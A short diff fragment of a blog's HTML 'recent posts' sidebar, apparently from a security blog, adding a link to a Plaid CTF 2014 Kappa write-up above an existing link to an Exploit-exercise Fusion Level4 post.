   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/">Plaid Ctf Kappa[275] in 2014</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/11/15/exploit-exercise-fusion-level4/">Exploit-exercise Fusion Level4</a>
